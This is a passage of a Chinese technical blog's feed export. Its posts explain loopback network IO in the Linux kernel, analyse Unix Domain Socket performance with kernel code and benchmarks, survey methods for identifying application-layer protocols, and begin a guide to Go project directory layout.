class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">//file:net/core/dev.c</span><br><span class="hljs-keyword">static</span> int <span class="hljs-variable">__init</span> <span class="hljs-title function_">net_dev_init</span>(<span class="hljs-params">void</span>)<br>&#123;<br> <span class="hljs-title function_">for_each_possible_cpu</span>(<span class="hljs-params">i</span>) &#123;<br>  <span class="hljs-variable">sd</span><span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">backlog</span>.<span class="hljs-property">poll</span> <span class="hljs-operator">=</span> <span class="hljs-variable">process_backlog</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原来<code>struct softnet_data</code> 默认的 poll 在初始化的时候设置成了 process_backlog 函数，来看看它都干了啥。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xl">static int process_backlog(struct napi_struct *napi, int quota)<br>&#123;<br> <span class="hljs-keyword">while</span>()&#123;<br>  <span class="hljs-function"><span class="hljs-title">while</span> ((skb = __skb_dequeue(&amp;sd-&gt;</span>process_queue))) &#123;<br>   __netif_receive_skb(skb);<br>  &#125;<br><br>  <span class="hljs-comment">//skb_queue_splice_tail_init()函数用于将链表a连接到链表b上，</span><br>  <span class="hljs-comment">//形成一个新的链表b，并将原来a的头变成空链表。</span><br>  <span class="hljs-function"><span class="hljs-title">qlen</span> = skb_queue_len(&amp;sd-&gt;</span>input_pkt_queue);<br>  <span class="hljs-keyword">if</span> (qlen)<br>   <span class="hljs-function"><span class="hljs-title">skb_queue_splice_tail_init</span>(&amp;sd-&gt;</span>input_pkt_queue,<br>         &amp;<span class="hljs-function"><span class="hljs-title">sd</span>-&gt;</span>process_queue);<br>  <br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次先看对 skb_queue_splice_tail_init 的调用。源码就不看了，直接说它的作用是把 sd-&gt;input_pkt_queue 里的 skb 链到 sd-&gt;process_queue 链表上去。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5C3y3FHJWIyHwAzvgQWpLBFXJ5l15ZeDCAanWCAtvUNIsbvEq66mO2gw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>然后再看 __skb_dequeue， __skb_dequeue 是从 sd-&gt;process_queue 上取下来包来处理。这样和前面发送过程的结尾处就对上了。发送过程是把包放到了 input_pkt_queue 队列里，接收过程是在从这个队列里取出 skb。</p><p>最后调用 __netif_receive_skb 将 skb(数据) 送往协议栈。在此之后的调用过程就和跨机网络 IO 又一致了。</p><p>送往协议栈的调用链是 __netif_receive_skb &#x3D;&gt; __netif_receive_skb_core &#x3D;&gt; deliver_skb 后 将数据包送入到 ip_rcv 中（详情参见<a href="https://mp.weixin.qq.com/s?__biz=MjM5Njg5NDgwNA==&mid=2247484058&idx=1&sn=a2621bc27c74b313528eefbc81ee8c0f&scene=21#wechat_redirect">图解Linux网络包接收过程</a> 一文中的 3.3 小节）。</p><p>网络再往后依次是传输层，最后唤醒用户进程，这里就不多展开了。</p><h2 id="四、本机网络-IO-总结"><a href="#四、本机网络-IO-总结" class="headerlink" title="四、本机网络 IO 总结"></a>四、本机网络 IO 总结</h2><p>我们来总结一下本机网络 IO 的内核执行流程。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5CrlAeJXFpBeXmkTiaSUZibFYPslfZf9lsAECbnicqJQJ6RLqcGca35gIicQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>回想下跨机网络 IO 的流程是</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5C7s16INFrDbRZaBl8WUkQZVvjrrCxRJz7FE2Yibrok5VyyIx9O9HFibZQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="五、思考题"><a href="#五、思考题" class="headerlink" title="五、思考题"></a>五、思考题</h2><p><strong>1）127.0.0.1 本机网络 IO 需要经过网卡吗？</strong></p><p>通过本文的叙述，我们确定地得出结论，<strong>不需要经过网卡</strong>。即使了把网卡拔了本机网络是否还可以正常使用的。</p><p><strong>2）数据包在内核中是个什么走向，和外网发送相比流程上有啥差别？</strong></p><p>总的来说，本机网络 IO 和跨机 IO 比较起来，确实是节约了一些开销。发送数据不需要进 RingBuffer 的驱动队列，直接把 skb 传给接收协议栈（经过软中断）。但是在内核其它组件上，可是一点都没少，系统调用、协议栈（传输层、网络层等）、网络设备子系统、邻居子系统整个走了一个遍。连“驱动”程序都走了（虽然对于回环设备来说只是一个纯软件的虚拟出来的东东）。所以即使是本机网络 IO，也别误以为没啥开销。</p><p>最后再提一下，业界有公司基于 ebpf 来加速 istio 架构中 sidecar 代理和本地进程之间的通信。通过引入 BPF，才算是绕开了内核协议栈的开销，原理如下。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/BBjAFF4hcwpyWdN4tva34saOuQBulk5COsndkFVqCeUgibSz6J2yibzfk7Zr2bAoNE1v39neic73BH0Tj5vWofbIA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unix Domain Socket 性能分析</title>
    <link href="/2022/11/25/UnixDomainSocket%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/"/>
    <url>/2022/11/25/UnixDomainSocket%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#             Unix Domain Socket 性能分析<blockquote><p>转载自张彦飞大佬的 <a href="https://zhuanlan.zhihu.com/p/448373622">本机网络 IO 之 Unix Domain Socket 性能分析</a></p></blockquote><h2 id="一、使用方法"><a href="#一、使用方法" class="headerlink" title="一、使用方法"></a><strong>一、使用方法</strong></h2><p>Unix Domain Socket（后面统一简称 UDS） 使用起来和传统的 socket 非常的相似。 区别点主要有两个地方需要关注。</p><p>第一，在创建 socket 的时候，普通的 socket 第一个参数 family 为 AF_INET， 而 UDS 指定为 AF_UNIX 即可。</p><p>第二，Server 的标识不再是 ip 和 端口，而是一个路径，例如 &#x2F;dev&#x2F;shm&#x2F;fpm-cgi.sock。</p><p>其实在平时我们使用 UDS 并不一定需要去写一段代码，很多应用程序都支持在本机网络 IO 的时候配置。例如在 Nginx 中，如果要访问的本机 fastcgi 服务是以 UDS 方式提供服务的话，只需要在配置文件中配置这么一行就搞定了。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">fastcgi_pass unix:/dev/shm/fpm-cgi.sock;<br></code></pre></td></tr></table></figure><p>如果 对于一个 UDS 的 server 来说，它的代码示例大概结构如下，大家简单了解一下。只是个示例不一定可运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-comment">// 创建 unix domain socket</span><br> <span class="hljs-type">int</span> fd = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br> <span class="hljs-comment">// 绑定监听</span><br> <span class="hljs-type">char</span> *socket_path = <span class="hljs-string">&quot;./server.sock&quot;</span>;<br> <span class="hljs-built_in">strcpy</span>(serun.sun_path, socket_path); <br> bind(fd, serun, ...);<br> listen(fd, <span class="hljs-number">128</span>);<br><br> <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>  <span class="hljs-comment">//接收新连接</span><br>  conn = accept(fd, ...);<br><br>  <span class="hljs-comment">//收发数据</span><br>  read(conn, ...);<br>  write(conn, ...);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>基于 UDS 的 client 也是和普通 socket 使用方式差不太多，创建一个 socket，然后 connect 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br> sock = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>);<br> connect(sockfd, ...)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、连接过程"><a href="#二、连接过程" class="headerlink" title="二、连接过程"></a><strong>二、连接过程</strong></h2><p>总的来说，基于 UDS 的连接过程比 inet 的 socket 连接过程要简单多了。客户端先创建一个自己用的 socket，然后调用 connect 来和服务器建立连接。</p><p>在 connect 的时候，会申请一个新 socket 给 server 端将来使用，和自己的 socket 建立好连接关系以后，就放到服务器正在监听的 socket 的接收队列中。 这个时候，服务器端通过 accept 就能获取到和客户端配好对的新 socket 了。</p><p>总的 UDS 的连接建立流程如下图。</p><p><img src="https://pic3.zhimg.com/80/v2-d397c683c0609ec73371a37aaebf3376_1440w.webp" alt="img"></p><p>内核源码中最重要的逻辑在 connect 函数中，我们来简单展开看一下。 unix 协议族中定义了这类 socket 的所有方法，它位于 net&#x2F;unix&#x2F;af_unix.c 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/unix/af_unix.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto_ops</span> <span class="hljs-title">unix_stream_ops</span> =</span> &#123;<br> .family = PF_UNIX,<br> .owner = THIS_MODULE,<br> .bind =  unix_bind,<br> .connect = unix_stream_connect,<br> .socketpair = unix_socketpair,<br> .listen = unix_listen,<br> ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们找到 connect 函数的具体实现，unix_stream_connect。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/unix/af_unix.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">unix_stream_connect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-keyword">struct</span> sockaddr *uaddr,</span><br><span class="hljs-params">          <span class="hljs-type">int</span> addr_len, <span class="hljs-type">int</span> flags)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span> *<span class="hljs-title">sunaddr</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_un *)uaddr;<br><br> ...<br><br> <span class="hljs-comment">// 1. 为服务器侧申请一个新的 socket 对象</span><br> newsk = unix_create1(sock_net(sk), <span class="hljs-literal">NULL</span>);<br><br> <span class="hljs-comment">// 2. 申请一个 skb，并关联上 newsk</span><br> skb = sock_wmalloc(newsk, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, GFP_KERNEL);<br> ...<br><br> <span class="hljs-comment">// 3. 建立两个 sock 对象之间的连接</span><br> unix_peer(newsk) = sk;<br> newsk-&gt;sk_state  = TCP_ESTABLISHED;<br> newsk-&gt;sk_type  = sk-&gt;sk_type;<br> ...<br> sk-&gt;sk_state = TCP_ESTABLISHED;<br> unix_peer(sk) = newsk;<br><br> <span class="hljs-comment">// 4. 把连接中的一头（新 socket）放到服务器接收队列中</span><br> __skb_queue_tail(&amp;other-&gt;sk_receive_queue, skb);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要的连接操作都是在这个函数中完成的。和我们平常所见的 TCP 连接建立过程，这个连接过程简直是太简单了。没有三次握手，也没有全连接队列、半连接队列，更没有啥超时重传。</p><p>直接就是将两个 socket 结构体中的指针互相指向对方就行了。就是 unix_peer(newsk) &#x3D; sk 和 unix_peer(sk) &#x3D; newsk 这两句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/unix/af_unix.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unix_peer(sk) (unix_sk(sk)-&gt;peer)</span><br></code></pre></td></tr></table></figure><p>当关联关系建立好之后，通过 __skb_queue_tail 将 skb 放到服务器的接收队列中。注意这里的 skb 里保存着新 socket 的指针，因为服务进程通过 accept 取出这个 skb 的时候，就能获取到和客户进程中 socket 建立好连接关系的另一个 socket。</p><p>怎么样，UDS 的连接建立过程是不是很简单！？</p><h2 id="三、发送过程"><a href="#三、发送过程" class="headerlink" title="三、发送过程"></a><strong>三、发送过程</strong></h2><p>看完了连接建立过程，再来看看基于 UDS 的数据的收发。这个收发过程一样也是非常的简单。发送方是直接将数据写到接收方的接收队列里的。</p><p><img src="https://pic4.zhimg.com/80/v2-8319e4008afe2534d41ba5ad29bb7447_1440w.webp" alt="img"></p><p>从 send 函数来看起。send 系统调用的源码位于文件 net&#x2F;socket.c 中。在这个系统调用里，内部其实真正使用的是 sendto 系统调用。它只干了两件简单的事情，</p><p>第一是在内核中把真正的 socket 找出来，在这个对象里记录着各种协议栈的函数地址。 第二是构造一个 struct msghdr 对象，把用户传入的数据，比如 buffer地址、数据长度啥的，统统都装进去. 剩下的事情就交给下一层，协议栈里的函数 inet_sendmsg 了，其中 inet_sendmsg 函数的地址是通过 socket 内核对象里的 ops 成员找到的。大致流程如图。</p><p><img src="https://pic2.zhimg.com/80/v2-b65fdb6a4828626631b6fe5cb0b1f765_1440w.webp" alt="img"></p><p>在进入到协议栈 inet_sendmsg 以后，内核接着会找到 socket 上的具体协议发送函数。对于 Unix Domain Socket 来说，那就是 unix_stream_sendmsg。 我们来看一下这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">unix_stream_sendmsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *kiocb, <span class="hljs-keyword">struct</span> socket *sock,</span><br><span class="hljs-params">          <span class="hljs-keyword">struct</span> msghdr *msg, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br> <span class="hljs-comment">// 1.申请一块缓存区</span><br> skb = sock_alloc_send_skb(sk, size, msg-&gt;msg_flags&amp;MSG_DONTWAIT,<br>      &amp;err);<br><br> <span class="hljs-comment">// 2.拷贝用户数据到内核缓存区</span><br> err = memcpy_fromiovec(skb_put(skb, size), msg-&gt;msg_iov, size);<br><br> <span class="hljs-comment">// 3. 查找socket peer</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">other</span> =</span> <span class="hljs-literal">NULL</span>;<br> other = unix_peer(sk);<br><br> <span class="hljs-comment">// 4.直接把 skb放到对端的接收队列中</span><br> skb_queue_tail(&amp;other-&gt;sk_receive_queue, skb);<br><br> <span class="hljs-comment">// 5.发送完毕回调</span><br> other-&gt;sk_data_ready(other, size);<br>&#125;<br></code></pre></td></tr></table></figure><p>和复杂的 TCP 发送接收过程相比，这里的发送逻辑简单简单到令人发指。申请一块内存（skb），把数据拷贝进去。根据 socket 对象找到另一端，<strong>直接把 skb 给放到对端的接收队列里了</strong></p><p>接收函数主题是 unix_stream_recvmsg，这个函数中只需要访问它自己的接收队列就行了，源码就不展示了。所以在本机网络 IO 场景里，基于 Unix Domain Socket 的服务性能上肯定要好一些的。</p><h2 id="四、性能对比"><a href="#四、性能对比" class="headerlink" title="四、性能对比"></a><strong>四、性能对比</strong></h2><p>为了验证 Unix Domain Socket 到底比基于 127.0.0.1 的性能好多少，一个性能测试。 在网络性能对比测试，最重要的两个指标是延迟和吞吐。 Github 上找了个好用的测试源码：<a href="https://link.zhihu.com/?target=https://github.com/rigtorp/ipc-bench">https://github.com/rigtorp/ipc-bench</a>。 测试环境是一台 4 核 CPU，8G 内存的 KVM 虚机。</p><p>在延迟指标上，对比结果如下图。</p><p><img src="https://pic4.zhimg.com/80/v2-f1c2ab0d2a2223594f507993066ce273_1440w.webp" alt="img"></p><p>可见在小包（100 字节）的情况下，UDS 方法的“网络” IO 平均延迟只有 2707 纳秒，而基于 TCP（访问 127.0.0.1）的方式下延迟高达 5690 纳秒。耗时整整是前者的两倍。</p><p>在包体达到 100 KB 以后，UDS 方法延迟 24 微秒左右（1 微秒等于 1000 纳秒），TCP 是 32 微秒，仍然高一截。这里低于 2 倍的关系了，是因为当包足够大的时候，网络协议栈上的开销就显得没那么明显了。</p><p>再来看看吞吐效果对比。</p><p><img src="https://pic2.zhimg.com/80/v2-bf038e44dfd6923f4f78057efbf33181_1440w.webp" alt="img"></p><p>在小包的情况下，带宽指标可以达到 854 M，而基于 TCP 的 IO 方式下只有 386。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a><strong>五、总结</strong></h2><p>本文分析了基于 Unix Domain Socket 的连接创建、以及数据收发过程。其中数据收发的工作过程如下图。</p><p><img src="https://pic4.zhimg.com/80/v2-8319e4008afe2534d41ba5ad29bb7447_1440w.webp" alt="img"></p><p>相对比本机网络 IO 通信过程上，它的工作过程要清爽许多。其中 127.0.0.1 工作过程如下图。</p><p><img src="https://pic2.zhimg.com/80/v2-1893a0e2865e14a61a5b2b443bdda571_1440w.webp" alt="img"></p><p>对比了 UDP 和 TCP 两种方式下的延迟和性能指标。在包体不大于 1KB 的时候，UDS 的性能大约是 TCP 的两倍多。<strong>所以，在本机网络 IO 的场景下，如果对性能敏感，可以考虑使用 Unix Domain Socket。</strong></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何识别网络应用层协议?</title>
    <link href="/2022/11/23/%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/11/23/%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                          如何识别网络应用层协议？<blockquote><p>能够标识出 Internet上每个流所使用的应用层协议是一系列网络应用的前提和基础。然而随着网络的高速化和协议的复杂化，传统的基于端 口识别应用层协议的算法已经不够准确，因此各种新的协议识别算法成为研究热点 。</p></blockquote><p>本篇文章将重点介绍协议识别问题的几个基本概念 ，以及目前主要实现方式各自的优缺点及关键技术和当前具有代表性的实现项目。</p><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1-1-流"><a href="#1-1-流" class="headerlink" title="1.1 流"></a>1.1 流</h3><p>指在某一段固定时间间隔内通过网络上一个观测点的 IP报文集合。属于一个特定流的所有报文有一些相同的属性。 应用层协议识别的对象不是单个报文，而是将“流”作为一个整体考虑。</p><h3 id="1-2-协议识别"><a href="#1-2-协议识别" class="headerlink" title="1.2 协议识别"></a>1.2 协议识别</h3><p>标识出网络上每个流所使用的应用层协议 ，其是基于使用类型的流分类的延伸和精化。在基于使用类型的流分类问题中，每个类别可能包含某些属性类似的多种协议 ，但协议识别问题必须对流进行更精细的分类 ， 使得每个类别中的流只使用一种应用层协议。</p><h3 id="1-3-流分类"><a href="#1-3-流分类" class="headerlink" title="1.3 流分类"></a>1.3 流分类</h3><p>指利用流以及流中报文的某些信息将网络上的流分成既定的若干类别 (如长流／短流，快流／慢 流，或者各种使用类型的流)，其是报文分类的扩展。</p><h3 id="1-4-解决协议识别问题的基本思路"><a href="#1-4-解决协议识别问题的基本思路" class="headerlink" title="1.4 解决协议识别问题的基本思路"></a>1.4 解决协议识别问题的基本思路</h3><p>从本质上看 ，协议识别问题是多元统计学中的判别，分析在实际中的应用。首先根据所选择的 维流信息将流分为 k个类别 ，每个 类别对应一个协议，对于新到来的流，计算其 自身的n维流信 息值 ，根据结果将其划分到相应的类别中，给出类别号即协议名。从理论上说 ，流中每个报文的任意字段或流传输过程 中 的任何特性都可以作为一维的流信息即协议识别的依据。但实际使用中，如何选择最有效的流信息维度是面临的最大困难 。</p><h2 id="二、实现方式"><a href="#二、实现方式" class="headerlink" title="二、实现方式"></a>二、实现方式</h2><h3 id="2-1-基于端口识别协议"><a href="#2-1-基于端口识别协议" class="headerlink" title="2.1 基于端口识别协议"></a>2.1 基于端口识别协议</h3><p>这是最简单也是识别正确率最低的一种方式，传统的应用层协议识别算法只利用了端 口号一 维信息，其根据各个应用层协议在中注册的端 口号 来标识 协议 。例 如 ，若某个 TCP流使用 了端 口号 80、8080或 443，则将其标记为 Web流量,53端口识别为dns等。</p><h3 id="2-2-基于负载识别协议"><a href="#2-2-基于负载识别协议" class="headerlink" title="2.2 基于负载识别协议"></a>2.2 基于负载识别协议</h3><p>基于负载的算法仍是一个一元判别 问题 ，其需要事先详细分析待识别的应用层协议，找出其交互过程中不 同于其他任何协议的字段，作为该协议的特征。在识别的过 程中，该类算法检查流中每个报文 TCP首部之后的负载部分 ，若匹配到某协议的特征 ，则将该流标记为相应的协议。基 于负载的算法不仅能识别出使用单一连接进行通信的协议 ，而且能够识别出如 PASVFTP、流媒体等使用多个连接、动态端口进行通信的协议。在这些协议 中，数据传输所使用的端口是在事先建立的控制连接中协商的。基于负载的算法检查控制连接中的每个报文 ，找出协商得到的端口号，并以此端口识别数据连接 。</p><p>优缺点：正确率高，不过当协议规范发生变化或者新协议出现时，寻找特征的工作必须重新进行，工作量非常大，更新困难 ，因此 ，该类算法通常只被用在需准确识别数量较少的协议时，且需要有相当的工作量。</p><h3 id="2-3-基于测度识别协议"><a href="#2-3-基于测度识别协议" class="headerlink" title="2.3 基于测度识别协议"></a>2.3 基于测度识别协议</h3><p>基于测度识别协议的算法利用协议规范的不同所造成的流测度的差异区别各个协 议 。例如 ，Web流一般为短流小报 文 ，而 P2P流一般为长 流大报文 。基 于测度 的算法 要求事先有标准的训练集可用，即要用已按各个协议分类的 报文集合来训练识别器，使其在使用的过程中根据已知的标 准答案和新计算 的流测 度 ，按 照某 种判别算法得出当前流所属的类别 ，即所使用的协议 。</p><p>优缺点：成熟度不够，样本需求大，相关开源实现项目少；</p><h3 id="2-4-基于行为特征的协议识别"><a href="#2-4-基于行为特征的协议识别" class="headerlink" title="2.4 基于行为特征的协议识别"></a>2.4 基于行为特征的协议识别</h3><p>将各个应用层协议的特点进行收集整理，对比数据包，匹配出对应的应用层协议。它需要训练数据集作为输入，构建一个分类器或者分类模型，通过模型识别为哪一种应用层协议</p><h3 id="2-5-综合算法"><a href="#2-5-综合算法" class="headerlink" title="2.5 综合算法"></a>2.5 综合算法</h3><p>综合上述方式实现对应用层协议的解析。</p><h2 id="三、WireShark的识别方式"><a href="#三、WireShark的识别方式" class="headerlink" title="三、WireShark的识别方式"></a>三、WireShark的识别方式</h2><h3 id="3-1-实现过程"><a href="#3-1-实现过程" class="headerlink" title="3.1 实现过程"></a>3.1 实现过程</h3><p>1.基于传输层协议获取可能的应用层协议集合，例如基于udp实现的可能是dns、zookper等，基于tcp可能为http、grpc等；下图为TCP&#x2F;IP详解一书中关于协议的引用。</p><p><img src="https://images0.cnblogs.com/blog/475022/201309/07223013-5e7d5f5443d747978b9eeb14f7ea98a2.png" alt="img"></p><p>2.基于负载匹配行为特征</p><h3 id="3-2-源码分析-todo"><a href="#3-2-源码分析-todo" class="headerlink" title="3.2 源码分析 todo"></a>3.2 源码分析 todo</h3><h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><p>1.陈 亮 龚 俭 徐 选.   应用层协议识别算法综述</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go项目目录结构该怎么写？</title>
    <link href="/2022/11/23/Go%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E8%AF%A5%E6%80%8E%E4%B9%88%E5%86%99%EF%BC%9F/"/>
    <url>/2022/11/23/Go%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E8%AF%A5%E6%80%8E%E4%B9%88%E5%86%99%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                                         Go项目目录结构该怎么写？<h2 id="Go-目录"><a href="#Go-目录" class="headerlink" title="Go 目录"></a>Go 目录</h2><p><img src="https://s2.loli.net/2022/11/22/IiQuegzXAqyxhT6.png" alt="image-20221122220821657.png"></p><h3 id="cmd"><a href="#cmd" class="headerlink" title="/cmd"></a><code>/cmd</code></h3><p>项目的主干。</p><p>每个应用程序的目录名应该与想要的可执行文件的名称相匹配(例如，<code>/cmd/myapp</code>)。</p><p>不要在这个目录中放置太多代码。如果认为代码可以导入并在其他项目中使用，那么它应该位于 <code>/pkg</code> 目录中。如果代码不是可重用的，或者不希望其他人重用它，将该代码放到 <code>/internal</code> 目录中。</p><p>通常有一个小的 <code>main</code> 函数，从 <code>/internal</code> 和 <code>/pkg</code> 目录导入和调用代码，除此之外没有别的东西。</p><p>相关实例：</p><ul><li><a href="https://github.com/vmware-tanzu/velero/tree/main/cmd">https://github.com/vmware-tanzu/velero/tree/main/cmd</a> (just a really small <code>main</code> function with everything else in packages)</li><li><a href="https://github.com/moby/moby/tree/master/cmd">https://github.com/moby/moby/tree/master/cmd</a></li><li><a href="https://github.com/prometheus/prometheus/tree/main/cmd">https://github.com/prometheus/prometheus/tree/main/cmd</a></li><li><a href="https://github.com/influxdata/influxdb/tree/master/cmd">https://github.com/influxdata/influxdb/tree/master/cmd</a></li><li><a href="https://github.com/kubernetes/kubernetes/tree/master/cmd">https://github.com/kubernetes/kubernetes/tree/master/cmd</a></li><li><a href="https://github.com/dapr/dapr/tree/master/cmd">https://github.com/dapr/dapr/tree/master/cmd</a></li><li><a href="https://github.com/ethereum/go-ethereum/tree/master/cmd">https://github.com/ethereum/go-ethereum/tree/master/cmd</a></li></ul><h3 id="internal"><a href="#internal" class="headerlink" title="/internal"></a><code>/internal</code></h3><p>私有应用程序和库代码。这是你不希望其他人在其应用程序或库中导入代码。请注意，这个布局模式是由 Go 编译器本身执行的。有关更多细节，可以参阅Go 1.4 <a href="https://golang.org/doc/go1.4#internalpackages"><code>release notes</code></a> 。注意，并不局限于顶级 <code>internal</code> 目录。在项目树的任何级别上都可以有多个内部目录。</p><p>可以选择向 internal 包中添加一些额外的结构，以分隔共享和非共享的内部代码。这不是必需的(特别是对于较小的项目)，但是最好有有可视化的线索来显示预期的包的用途。实际应用程序代码可以放在 <code>/internal/app</code> 目录下(例如 <code>/internal/app/myapp</code>)，这些应用程序共享的代码可以放在 <code>/internal/pkg</code> 目录下(例如 <code>/internal/pkg/myprivlib</code>)。</p><h3 id="pkg"><a href="#pkg" class="headerlink" title="/pkg"></a><code>/pkg</code></h3><p>外部应用程序可以使用的库代码(例如 <code>/pkg/mypubliclib</code>)。其他项目会导入这些库，希望它们能正常工作，所以在这里放东西之前要三思:-)注意，<code>internal</code> 目录是确保私有包不可导入的更好方法，因为它是由 Go 